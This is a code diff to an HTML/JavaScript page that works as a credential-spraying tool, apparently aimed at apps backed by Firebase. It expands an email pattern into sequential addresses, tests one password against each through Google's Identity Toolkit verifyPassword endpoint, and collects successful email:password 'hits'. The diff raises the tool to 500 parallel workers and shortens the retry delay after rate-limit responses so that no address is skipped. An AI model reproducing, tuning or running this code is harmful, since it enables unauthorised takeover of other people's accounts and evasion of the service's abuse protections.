@@ -1,46 +1,45 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>CPM Hyper-Sequential</title>
+    <title>SONIC SEQUENTIAL V7</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
-        body { background: #000; color: #00ff00; font-family: 'Courier New', monospace; padding: 10px; text-align: center; margin: 0; }
-        .bot-frame { max-width: 500px; margin: auto; border: 2px solid #00ff00; background: #050505; padding: 20px; box-shadow: 0 0 30px #00ff00; border-radius: 5px; }
-        h1 { font-size: 18px; border-bottom: 1px solid #00ff00; padding-bottom: 10px; color: #fff; text-transform: uppercase; }
+        body { background: #000; color: #ff0055; font-family: 'Courier New', monospace; padding: 10px; text-align: center; margin: 0; }
+        .bot-terminal { max-width: 550px; margin: auto; border: 2px solid #ff0055; background: #050505; padding: 20px; box-shadow: 0 0 40px #ff0055; border-radius: 5px; }
+        h1 { font-size: 20px; border-bottom: 1px solid #ff0055; padding-bottom: 10px; color: #fff; text-shadow: 0 0 10px #ff0055; }
         
-        input { width: 100%; padding: 14px; margin: 8px 0; background: #000; border: 1px solid #00ff00; color: #fff; outline: none; box-sizing: border-box; font-size: 16px; }
-        .btn-ignite { width: 100%; padding: 20px; background: #00ff00; color: #000; border: none; font-weight: bold; font-size: 18px; cursor: pointer; margin-top: 10px; box-shadow: 0 0 15px #00ff00; }
+        input { width: 100%; padding: 14px; margin: 8px 0; background: #000; border: 1px solid #ff0055; color: #fff; outline: none; box-sizing: border-box; font-size: 16px; }
+        .btn-ignite { width: 100%; padding: 20px; background: #ff0055; color: #fff; border: none; font-weight: bold; font-size: 20px; cursor: pointer; margin-top: 10px; box-shadow: 0 0 20px #ff0055; }
         
-        .status-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin: 20px 0; }
-        .stat-item { background: #111; padding: 15px; border: 1px solid #333; }
-        .stat-item b { font-size: 28px; color: #fff; display: block; }
+        .monitor { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin: 20px 0; background: #111; padding: 15px; border: 1px dashed #ff0055; }
+        .monitor b { font-size: 32px; color: #fff; display: block; }
 
-        #log-stream { height: 100px; width: 100%; background: #000; color: #0c0; font-size: 11px; text-align: left; padding: 8px; border: 1px solid #222; overflow: hidden; margin-bottom: 10px; }
-        #res-box { width: 100%; height: 250px; background: #000; color: #fff; border: 1px solid #00ff00; padding: 10px; font-size: 13px; box-sizing: border-box; }
+        #live-status { height: 25px; width: 100%; color: #ff0055; font-size: 12px; font-weight: bold; overflow: hidden; margin-bottom: 5px; }
+        #res-box { width: 100%; height: 280px; background: #000; color: #00ff00; border: 1px solid #00ff00; padding: 10px; font-size: 13px; box-sizing: border-box; }
         
-        .copy-btn { width: 100%; padding: 12px; background: #111; color: #00ff00; border: 1px solid #00ff00; margin-top: 10px; cursor: pointer; font-weight: bold; }
+        .copy-btn { width: 100%; padding: 12px; background: #111; color: #ff0055; border: 1px solid #ff0055; margin-top: 10px; cursor: pointer; font-weight: bold; }
     </style>
 </head>
 <body>
 
-<div class="bot-frame">
-    <h1>⚡ HYPER-SEQUENTIAL V6</h1>
+<div class="bot-terminal">
+    <h1>🚀 SONIC SEQUENTIAL</h1>
     
-    <input type="text" id="fmt" placeholder="FORMAT: CPM_{6}_@GMAIL.COM">
+    <input type="text" id="fmt" placeholder="FORMAT: USER_{6}_@GMAIL.COM">
     <input type="text" id="pwd" placeholder="PASSWORD">
     
-    <button class="btn-ignite" id="btn" onclick="ignite()">🚀 START TURBO SCAN</button>
+    <button class="btn-ignite" id="btn" onclick="sonicIgnite()">⚡ START SONIC SCAN</button>
 
-    <div class="status-grid">
-        <div class="stat-item">CHECKED<b id="c_val">0</b></div>
-        <div class="stat-item">FOUND<b id="f_val">0</b></div>
+    <div class="monitor">
+        <div>CHECKED<b id="c_val">0</b></div>
+        <div>FOUND<b id="f_val">0</b></div>
     </div>
 
-    <div id="log-stream">System: Waiting for command...</div>
+    <div id="live-status">Ready for Overclocking...</div>
 
-    <textarea id="res-box" readonly placeholder="Hits: Email:Pass"></textarea>
+    <textarea id="res-box" readonly placeholder="Result: Email:Pass"></textarea>
     
-    <button class="copy-btn" onclick="copyResults()">📋 COPY ALL HITS</button>
+    <button class="copy-btn" onclick="copyResults()">📋 COPY ALL EMAIL:PASS</button>
 </div>
 
 <script>
@@ -48,9 +47,10 @@
     let checked = 0;
     let found = 0;
     let nextToProcess = 0;
-    let resultsBuffer = {}; // Buffer to store out-of-order results
+    let index = 0;
+    let resultsBuffer = new Map();
 
-    async function ignite() {
+    async function sonicIgnite() {
         if (active) { location.reload(); return; }
         
         let fmt = document.getElementById('fmt').value.toUpperCase().trim();
@@ -60,33 +60,31 @@
         if (!fmt.includes('{') || !pwd) return alert("Enter Data!");
 
         active = true;
-        document.getElementById('btn').innerText = "🛑 TERMINATE ENGINE";
-        document.getElementById('btn').style.background = "#f00";
+        document.getElementById('btn').innerText = "🛑 ABORT MISSION";
+        document.getElementById('btn').style.background = "#fff";
+        document.getElementById('btn').style.color = "#000";
         
         let digits = fmt.match(/\{(\d+)\}/)[1];
         let max = Math.pow(10, digits);
 
-        // --- EXTREME CONCURRENCY (300 Parallel Workers) ---
-        // ഒരേസമയം 300 അക്കൗണ്ടുകൾ പമ്പ് ചെയ്യുന്നു.
-        let concurrentLimit = 300; 
-        let index = 0;
+        // --- SONIC OVERCLOCKING: 500 PARALLEL RUNNERS ---
+        // ഒരേസമയം 500 അക്കൗണ്ടുകൾ പമ്പ് ചെയ്യുന്നു.
+        const workers = 500; 
 
-        async function startWorker() {
-            while (active && index < max) {
-                let currentIdx = index++;
-                let numStr = currentIdx.toString().padStart(digits, '0');
-                let email = fmt.replace(/\{(\d+)\}/, numStr);
-                
-                await checkAcc(email, pwd, key, currentIdx, numStr);
-            }
-        }
-
-        for (let i = 0; i < concurrentLimit; i++) {
-            startWorker();
+        for (let i = 0; i < workers; i++) {
+            (async function() {
+                while (active && index < max) {
+                    let currentIdx = index++;
+                    let numStr = currentIdx.toString().padStart(digits, '0');
+                    let email = fmt.replace(/\{(\d+)\}/, numStr);
+                    
+                    await checkAccount(email, pwd, key, currentIdx);
+                }
+            })();
         }
     }
 
-    async function checkAcc(em, pw, k, idx, num) {
+    async function checkAccount(em, pw, k, idx) {
         try {
             let r = await fetch(`https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=${k}`, {
                 method: 'POST',
@@ -95,20 +93,17 @@
             });
             
             if (r.status === 429) {
-                // Rate limited - retry immediately for no-skip
-                await new Promise(res => setTimeout(res, 1000));
-                return checkAcc(em, pw, k, idx, num);
+                await new Promise(res => setTimeout(res, 500)); // Short cooldown
+                return checkAccount(em, pw, k, idx); // No-skip retry
             }
 
             let d = await r.json();
-            
-            // Store result in buffer to maintain strict order
-            resultsBuffer[idx] = { found: (d && d.idToken), email: em };
-            
-            // --- STRICT SEQUENTIAL OUTPUT LOGIC ---
-            // ബഫറിൽ അടുത്ത നമ്പർ ഉണ്ടോ എന്ന് നോക്കി ഓർഡറിൽ പ്രിന്റ് ചെയ്യുന്നു
-            while (resultsBuffer[nextToProcess]) {
-                let data = resultsBuffer[nextToProcess];
+            resultsBuffer.set(idx, { found: (d && d.idToken), email: em });
+
+            // --- INSTANT SEQUENTIAL FLUSH ---
+            // ബഫറിലുള്ള നമ്പറുകൾ ഓർഡറിൽ പടപടാന്ന് റിലീസ് ചെയ്യുന്നു
+            while (resultsBuffer.has(nextToProcess)) {
+                let data = resultsBuffer.get(nextToProcess);
                 if (data.found) {
                     found++;
                     document.getElementById('f_val').innerText = found;
@@ -119,23 +114,16 @@
                 checked++;
                 if (checked % 10 === 0) {
                     document.getElementById('c_val').innerText = checked;
-                    writeLog(`STRICT: Verified ${data.email}`);
+                    document.getElementById('live-status').innerText = "Sonic Scanning: " + data.email;
                 }
                 
-                delete resultsBuffer[nextToProcess];
+                resultsBuffer.delete(nextToProcess);
                 nextToProcess++;
             }
 
         } catch (e) {
-            return checkAcc(em, pw, k, idx, num); // Retry on network error
+            return checkAccount(em, pw, k, idx); // Network retry
         }
-    }
-
-    function writeLog(msg) {
-        let l = document.getElementById('log-stream');
-        l.innerHTML += `> ${msg}<br>`;
-        l.scrollTop = l.scrollHeight;
-        if (l.innerHTML.length > 1000) l.innerHTML = l.innerHTML.substring(500);
     }
 
     function copyResults() {
